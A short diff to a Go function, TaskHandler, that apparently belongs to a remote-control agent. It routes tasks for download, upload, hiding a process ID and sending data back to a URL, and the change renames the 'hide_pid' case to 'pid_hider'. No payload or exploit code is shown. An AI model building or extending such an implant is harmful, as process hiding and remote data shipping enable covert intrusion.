@@ -52,7 +52,7 @@ func TaskHandler(taskData map[string]interface{}, url string) {
 		agent_helper.DownloadHandler(url, taskData)
 	case "upload":
 		agent_helper.UploadHandler(url, taskData)
-	case "hide_pid":
+	case "pid_hider":
 		agent_helper.PidHiderHandler(url, taskData)
 	default:
 		agent_helper.DataShipper(url, taskData, "unknown task")
